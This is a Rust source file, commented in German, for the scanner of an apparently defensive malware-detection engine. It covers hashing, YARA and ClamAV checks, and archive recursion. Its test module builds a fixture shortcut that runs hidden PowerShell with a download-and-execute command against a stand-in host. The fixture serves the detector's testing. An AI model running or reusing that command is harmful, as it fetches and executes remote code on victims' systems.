//! Scanner: prüft Dateien und Ordner **nur lesend** und bewertet sie.

use std::fs::File;
use std::io::{self, Read};
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use aegis_core::risk::RiskLevel;

use crate::archive::{self, Budget, Member};
use crate::clamav::ClamAv;
use crate::finding::{self, Category, Contained, Finding, MAX_CONTAINED, Reason, Source, Weight};
use crate::hashlist::HashList;
use crate::yara::YaraRules;
use crate::{clamav, eicar, hash, heuristics, lnk, office, pdf, pe, script, traits, yara};

/// Ergebnis der Inhaltsprüfung (Datei oder Eintrag eines Containers).
#[derive(Debug, Default)]
struct Analysis {
    reasons: Vec<Reason>,
    not_scannable: Option<String>,
    contained: Vec<Contained>,
}

/// Hängt einen Hinweis an „nicht (vollständig) prüfbar“ an.
fn note(target: &mut Option<String>, text: impl Into<String>) {
    let text = text.into();
    match target {
        Some(existing) if !existing.contains(&text) => {
            existing.push_str(" · ");
            existing.push_str(&text);
        }
        Some(_) => {}
        None => *target = Some(text),
    }
}

fn list(names: &[String]) -> String {
    let shown: Vec<&str> = names.iter().take(5).map(String::as_str).collect();
    if names.len() > shown.len() {
        format!(
            "{} und {} weitere",
            shown.join(", "),
            names.len() - shown.len()
        )
    } else {
        shown.join(", ")
    }
}

/// Grenzen gegen Überlastung (riesige Dateien, tiefe Ordner).
#[derive(Debug, Clone, Copy)]
pub struct ScanLimits {
    /// Bis zu dieser Größe wird der Inhalt analysiert (YARA, PE); größere Dateien werden nur
    /// gehasht und als „teilweise geprüft“ markiert.
    pub max_analyze_bytes: u64,
    /// Maximale Ordnertiefe.
    pub max_depth: usize,
    /// Maximale Anzahl Dateien pro Lauf.
    pub max_files: u64,
}

impl Default for ScanLimits {
    fn default() -> Self {
        Self {
            max_analyze_bytes: 128 * 1024 * 1024,
            max_depth: 32,
            max_files: 1_000_000,
        }
    }
}

/// Konfiguration der Engine.
#[derive(Debug, Default)]
pub struct EngineConfig {
    /// Hash-Listen.
    pub hash_lists: Vec<HashList>,
    /// YARA-Regeln (eingebaut + lizenzierte).
    pub yara: Option<YaraRules>,
    /// ClamAV, falls installiert und aktiviert.
    pub clamav: Option<ClamAv>,
    /// Grenzen.
    pub limits: ScanLimits,
}

/// Die Engine.
#[derive(Debug)]
pub struct Engine {
    config: EngineConfig,
}

/// Übersprungener Pfad mit Grund.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Skipped {
    /// Pfad.
    pub path: PathBuf,
    /// Grund.
    pub reason: String,
}

/// Ergebnis eines Laufs.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScanReport {
    /// Alle geprüften Dateien.
    pub findings: Vec<Finding>,
    /// Übersprungen (Links, Sonderdateien, Grenzen, Lesefehler).
    pub skipped: Vec<Skipped>,
    /// Abgebrochen wegen `max_files`?
    pub truncated: bool,
}

impl ScanReport {
    /// Nur Funde oberhalb von „Sauber“.
    pub fn notable(&self) -> impl Iterator<Item = &Finding> {
        self.findings
            .iter()
            .filter(|f| f.risk > aegis_core::risk::RiskLevel::Clean)
    }
}

impl Engine {
    /// Neue Engine.
    #[must_use]
    pub fn new(config: EngineConfig) -> Self {
        Self { config }
    }

    /// Engine mit den eingebauten YARA-Regeln und ohne ClamAV/Hash-Listen.
    ///
    /// # Errors
    /// Die eingebauten Regeln lassen sich nicht kompilieren.
    pub fn with_builtin_rules() -> Result<Self, String> {
        Ok(Self::new(EngineConfig {
            yara: Some(YaraRules::builtin()?),
            ..EngineConfig::default()
        }))
    }

    /// Prüft eine Datei. Liest nur; folgt keinen Links.
    #[must_use]
    pub fn scan_file(&self, path: &Path) -> Finding {
        let mut reasons: Vec<Reason> = heuristics::reasons(path);
        let mut not_scannable = None;
        let mut contained = Vec::new();
        let (sha256, size) = match read_and_hash(path, self.config.limits.max_analyze_bytes) {
            Ok(read) => {
                if read.truncated {
                    not_scannable = Some(format!(
                        "Nur teilweise geprüft: größer als {} MiB (Inhalt nicht analysiert, Prüfsumme vollständig).",
                        self.config.limits.max_analyze_bytes / (1024 * 1024)
                    ));
                } else {
                    let name = path
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_default();
                    let mut budget = Budget {
                        max_member: self.config.limits.max_analyze_bytes,
                        ..Budget::default()
                    };
                    let analysis = self.analyze(&name, &read.head, 0, &mut budget);
                    reasons.extend(analysis.reasons);
                    if let Some(n) = analysis.not_scannable {
                        note(&mut not_scannable, n);
                    }
                    contained = analysis.contained;
                }
                for list in &self.config.hash_lists {
                    if let Some(label) = list.lookup(&read.sha256) {
                        let label = if label.is_empty() {
                            "ohne Bezeichnung"
                        } else {
                            label
                        };
                        reasons.push(Reason::new(
                            "hashlist.match",
                            Source::HashList {
                                list: list.name().to_owned(),
                            },
                            Weight::Definite(aegis_core::risk::RiskLevel::Dangerous),
                            &format!("Prüfsumme steht in der Liste „{}“ ({label}).", list.name()),
                            &format!("Checksum is listed in \"{}\" ({label}).", list.name()),
                        ));
                    }
                }
                (Some(hash::to_hex(&read.sha256)), read.size)
            }
            Err(e) => {
                not_scannable = Some(format!("Nicht lesbar: {e}"));
                (None, 0)
            }
        };
        if let Some(clam) = &self.config.clamav {
            let result = clam.scan(path);
            if let clamav::ClamResult::Error(e) = &result {
                not_scannable.get_or_insert_with(|| format!("ClamAV: {e}"));
            }
            reasons.extend(clamav::reasons(&result));
        }
        let (risk, confidence, category) = finding::assess(&reasons);
        let (summary_de, summary_en) = finding::summarize(risk, category, &reasons);
        Finding {
            path: path.to_owned(),
            sha256,
            size,
            risk,
            confidence,
            category,
            summary_de,
            summary_en,
            recommendation: finding::recommend(risk),
            reasons,
            not_scannable,
            contained,
            trusted: None,
        }
    }

    /// Prüft Inhalt (einer Datei oder eines Archiv-Eintrags) mit allen Schichten; Container
    /// werden – begrenzt durch `budget` – rekursiv geprüft.
    fn analyze(&self, name: &str, bytes: &[u8], depth: u8, budget: &mut Budget) -> Analysis {
        let mut a = Analysis::default();
        if depth > 0 {
            a.reasons.extend(heuristics::name_reasons(name));
        }
        if eicar::is_eicar(bytes) {
            a.reasons.push(Reason::new(
                "eicar",
                Source::Eicar,
                Weight::Definite(RiskLevel::Dangerous),
                "Enthält die EICAR-Prüfzeichenkette.",
                "Contains the EICAR test string.",
            ));
        }
        if pe::looks_like_pe(bytes) {
            match pe::analyze(bytes) {
                Ok(info) => a.reasons.extend(pe::reasons(&info)),
                Err(e) => a.reasons.push(pe::malformed_reason(&e)),
            }
        }
        if let Some(rules) = &self.config.yara {
            match rules.scan(bytes) {
                Ok(hits) => {
                    a.reasons.extend(hits.iter().map(yara::reason));
                    a.reasons.extend(traits::combine(&hits));
                }
                Err(e) => note(&mut a.not_scannable, format!("YARA: {e}")),
            }
        }
        let lower = name.to_ascii_lowercase();
        if script::is_script_name(name) || lower.ends_with(".hta") {
            a.reasons.extend(script::reasons(bytes));
        }
        if office::is_ole(bytes) {
            a.reasons.extend(office::macro_reasons(bytes));
        } else if office::is_rtf(bytes) {
            a.reasons.extend(office::rtf_reasons(bytes));
        } else if office::is_ooxml(bytes) {
            a.reasons.extend(office::macro_reasons(bytes));
            a.reasons.extend(office::ooxml_reasons(bytes));
        }
        if pdf::is_pdf(bytes) {
            a.reasons.extend(pdf::reasons(bytes));
        }
        if lnk::is_lnk(bytes)
            && let Some(info) = lnk::parse(bytes)
        {
            a.reasons.extend(lnk::reasons(&info));
        }
        if let Some(kind) = archive::detect(name, bytes) {
            self.analyze_container(kind, name, bytes, depth, budget, &mut a);
        }
        a
    }

    fn analyze_container(
        &self,
        kind: archive::ContainerKind,
        name: &str,
        bytes: &[u8],
        depth: u8,
        budget: &mut Budget,
        a: &mut Analysis,
    ) {
        if depth >= budget.max_depth {
            note(
                &mut a.not_scannable,
                "Zu tief verschachtelt – innere Archive nicht geprüft",
            );
            return;
        }
        let mut encrypted = Vec::new();
        let mut too_large = Vec::new();
        let mut unreadable = Vec::new();
        let mut children: Vec<(String, Analysis)> = Vec::new();
        let mut program_inside = false;
        let listing = archive::members(
            kind,
            name,
            bytes,
            budget,
            &mut |member, budget| match member {
                Member::Data { name: inner, bytes } => {
                    program_inside |=
                        heuristics::is_executable_name(&inner) || script::is_script_name(&inner);
                    let child = self.analyze(&inner, &bytes, depth + 1, budget);
                    children.push((inner, child));
                }
                Member::Encrypted { name } => encrypted.push(name),
                Member::TooLarge { name } => too_large.push(name),
                Member::Unreadable { name, error } => unreadable.push(format!("{name} ({error})")),
            },
        );
        let label = kind.label();
        let mut member_reasons = 0usize;
        for (inner, child) in children {
            let (risk, _, category) = finding::assess(&child.reasons);
            if let Some(n) = &child.not_scannable {
                note(&mut a.not_scannable, format!("{inner}: {n}"));
            }
            for mut nested in child.contained {
                if a.contained.len() < MAX_CONTAINED {
                    nested.name = format!("{inner}/{}", nested.name);
                    a.contained.push(nested);
                }
            }
            if risk == RiskLevel::Clean {
                continue;
            }
            let (summary_de, summary_en) = finding::summarize(risk, category, &child.reasons);
            let top = child
                .reasons
                .iter()
                .filter(|r| matches!(r.weight, Weight::Definite(l) if l == risk))
                .max_by_key(|r| {
                    matches!(
                        r.source,
                        Source::Eicar | Source::HashList { .. } | Source::Yara { .. }
                    )
                });
            if member_reasons < 20 {
                if let Some(top) = top {
                    member_reasons += 1;
                    let source = if category == Category::TestFile {
                        Source::Eicar
                    } else {
                        Source::Container
                    };
                    a.reasons.push(Reason::new(
                        "container.member",
                        source,
                        Weight::Definite(risk),
                        &format!("Enthält „{inner}“: {}", top.de),
                        &format!("Contains \"{inner}\": {}", top.en),
                    ));
                } else if risk == RiskLevel::Suspicious {
                    member_reasons += 1;
                    a.reasons.push(Reason::new(
                        "container.member_suspicious",
                        Source::Container,
                        Weight::Score(u8::try_from(finding::SUSPICIOUS_SCORE).unwrap_or(60)),
                        &format!("Enthält die auffällige Datei „{inner}“."),
                        &format!("Contains the suspicious file \"{inner}\"."),
                    ));
                }
            }
            if a.contained.len() < MAX_CONTAINED {
                a.contained.push(Contained {
                    name: inner,
                    risk,
                    category,
                    summary_de,
                    summary_en,
                    reasons: child.reasons,
                });
            }
        }
        if !encrypted.is_empty() || listing.encrypted {
            a.reasons.push(Reason::new(
                "container.encrypted",
                Source::Container,
                Weight::Score(15),
                "Passwortgeschützter Inhalt – Scanner können nicht hineinsehen; so wird Schadsoftware gern verschickt.",
                "Password-protected content – scanners cannot look inside; malware is often sent this way.",
            ));
            let which = if encrypted.is_empty() {
                format!("{label}-Archiv")
            } else {
                list(&encrypted)
            };
            note(
                &mut a.not_scannable,
                format!("Passwortgeschützt, nicht prüfbar: {which}"),
            );
        }
        if !too_large.is_empty() {
            a.reasons.push(Reason::new(
                "container.bomb",
                Source::Container,
                Weight::Score(30),
                "Ein Eintrag entpackt sich zu einer riesigen Datei (möglicherweise Zip-Bombe).",
                "An entry unpacks to a huge file (possibly a zip bomb).",
            ));
            note(
                &mut a.not_scannable,
                format!("Zu groß zum Prüfen: {}", list(&too_large)),
            );
        }
        if !unreadable.is_empty() {
            note(
                &mut a.not_scannable,
                format!("Nicht lesbar: {}", list(&unreadable)),
            );
        }
        if listing.truncated {
            note(
                &mut a.not_scannable,
                "Nicht alle Inhalte geprüft (Grenzen gegen Zip-Bomben erreicht)",
            );
        }
        if let Some(e) = listing.error {
            note(&mut a.not_scannable, format!("{label} nicht lesbar: {e}"));
        }
        if listing.unsupported {
            let text = if kind == archive::ContainerKind::Rar {
                "RAR-Archive entpackt AEGIS nicht selbst; ClamAV prüft sie, wenn installiert"
            } else {
                "Datenträger-Abbild – Inhalt wird nicht entpackt"
            };
            note(&mut a.not_scannable, text);
        }
        if kind.is_image() && (program_inside || listing.unsupported) {
            a.reasons.push(Reason::new(
                "container.image_with_program",
                Source::Container,
                Weight::Score(25),
                "Abbild-Datei mit Programm: Beim Öffnen übernimmt Windows den Download-Hinweis nicht – ein beliebter Trick, um Warnungen zu umgehen.",
                "Image file containing a program: when opened, Windows does not carry over the download warning – a popular trick to bypass warnings.",
            ));
        }
    }

    /// Prüft Dateien und Ordner (rekursiv, ohne Links zu folgen).
    #[must_use]
    pub fn scan_paths(&self, roots: &[PathBuf]) -> ScanReport {
        let mut report = ScanReport::default();
        let mut count = 0u64;
        let mut stack: Vec<(PathBuf, usize)> = roots.iter().map(|p| (p.clone(), 0)).collect();
        while let Some((path, depth)) = stack.pop() {
            let meta = match std::fs::symlink_metadata(&path) {
                Ok(m) => m,
                Err(e) => {
                    report.skipped.push(Skipped {
                        path,
                        reason: format!("Nicht lesbar: {e}"),
                    });
                    continue;
                }
            };
            if meta.file_type().is_symlink() || is_reparse_point(&path, &meta) {
                report.skipped.push(Skipped {
                    path,
                    reason: "Verknüpfung (Link) – nicht verfolgt".into(),
                });
            } else if meta.is_dir() {
                if depth >= self.config.limits.max_depth {
                    report.skipped.push(Skipped {
                        path,
                        reason: "Zu tief verschachtelt".into(),
                    });
                    continue;
                }
                match std::fs::read_dir(&path) {
                    Ok(entries) => {
                        let mut children: Vec<PathBuf> =
                            entries.filter_map(|e| e.ok().map(|e| e.path())).collect();
                        children.sort();
                        stack.extend(children.into_iter().rev().map(|c| (c, depth + 1)));
                    }
                    Err(e) => report.skipped.push(Skipped {
                        path,
                        reason: format!("Ordner nicht lesbar: {e}"),
                    }),
                }
            } else if meta.is_file() {
                if count >= self.config.limits.max_files {
                    report.truncated = true;
                    break;
                }
                count += 1;
                report.findings.push(self.scan_file(&path));
            } else {
                report.skipped.push(Skipped {
                    path,
                    reason: "Sonderdatei (Gerät, Pipe, Socket)".into(),
                });
            }
        }
        report
    }
}

/// Nur echte Links/Abzweigungen werden nicht verfolgt; komprimierte Systemdateien (WOF),
/// Deduplizierung und Cloud-Platzhalter sind normale Dateien und werden geprüft.
#[cfg(windows)]
fn is_reparse_point(path: &Path, meta: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    meta.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
        && aegis_winffi::is_name_surrogate(path).unwrap_or(true)
}

#[cfg(not(windows))]
fn is_reparse_point(_path: &Path, _meta: &std::fs::Metadata) -> bool {
    false
}

struct ReadResult {
    head: Vec<u8>,
    sha256: [u8; 32],
    size: u64,
    truncated: bool,
}

/// Öffnet eine reguläre Datei nur zum Lesen – **ohne** Links zu folgen, auch nicht, wenn
/// der Pfad zwischen Prüfen und Öffnen ausgetauscht wird: Nach dem Öffnen wird am Handle
/// geprüft, dass es genau diese Datei ist (Windows: tatsächlicher Pfad; Unix: Gerät + Inode).
///
/// # Errors
/// Keine reguläre Datei, Link oder nicht lesbar.
pub fn open_regular(path: &Path) -> io::Result<(File, std::fs::Metadata)> {
    let meta = std::fs::symlink_metadata(path)?;
    if !meta.is_file() {
        return Err(io::Error::other("keine reguläre Datei"));
    }
    let file = File::open(path)?;
    #[cfg(windows)]
    aegis_winffi::ensure_file_at(&file, path)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let opened = file.metadata()?;
        if opened.dev() != meta.dev() || opened.ino() != meta.ino() || !opened.is_file() {
            return Err(io::Error::other(
                "Datei wurde zwischen Prüfen und Öffnen ausgetauscht – nicht geprüft",
            ));
        }
    }
    Ok((file, meta))
}

/// Liest bis `limit` Byte in den Speicher und hasht die ganze Datei in einem Durchgang.
fn read_and_hash(path: &Path, limit: u64) -> io::Result<ReadResult> {
    let (mut file, meta) = open_regular(path)?;
    let mut hasher = Sha256::new();
    let mut head = Vec::with_capacity(usize::try_from(meta.len().min(limit)).unwrap_or(0));
    let mut buf = vec![0u8; 64 * 1024];
    let mut size = 0u64;
    loop {
        let n = match file.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => n,
            Err(e) if e.kind() == io::ErrorKind::Interrupted => continue,
            Err(e) => return Err(e),
        };
        hasher.update(&buf[..n]);
        let room = limit.saturating_sub(size);
        let take = usize::try_from(room.min(n as u64)).unwrap_or(0);
        head.extend_from_slice(&buf[..take]);
        size = size.saturating_add(n as u64);
    }
    Ok(ReadResult {
        head,
        sha256: hasher.finalize().into(),
        size,
        truncated: size > limit,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn iso_mit_verknuepfung_auf_powershell() {
        let shortcut = crate::lnk::tests::build(
            r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-w hidden -c iwr http://example.invalid/a | iex",
            "",
            7,
        );
        let image = crate::iso::tests::build(&[("rechnung.lnk", &shortcut)]);
        let engine = Engine::with_builtin_rules().unwrap_or_else(|e| panic!("{e}"));
        let mut budget = Budget::default();
        let a = engine.analyze("rechnung.iso", &image, 0, &mut budget);
        let codes: Vec<&str> = a.reasons.iter().map(|r| r.code.as_str()).collect();
        assert!(codes.contains(&"container.image_with_program"), "{codes:?}");
        assert!(codes.contains(&"container.member_suspicious"), "{codes:?}");
        assert_eq!(a.contained[0].name, "RECHNUNG.LNK");
        assert_eq!(a.contained[0].risk, RiskLevel::Suspicious);
        let (risk, _, _) = finding::assess(&a.reasons);
        assert_eq!(
            risk,
            RiskLevel::Suspicious,
            "Heuristik bleibt unter „Gefährlich“"
        );
    }

    #[test]
    fn verschachtelung_ist_begrenzt() {
        let mut inner = crate::archive::tests::zip_of(&[("x.txt", b"x")]);
        for i in 0..5 {
            inner = crate::archive::tests::zip_of(&[(&format!("ebene{i}.zip"), &inner)]);
        }
        let engine = Engine::new(EngineConfig::default());
        let a = engine.analyze("tief.zip", &inner, 0, &mut Budget::default());
        assert!(
            a.not_scannable
                .unwrap_or_default()
                .contains("Zu tief verschachtelt")
        );
    }
}
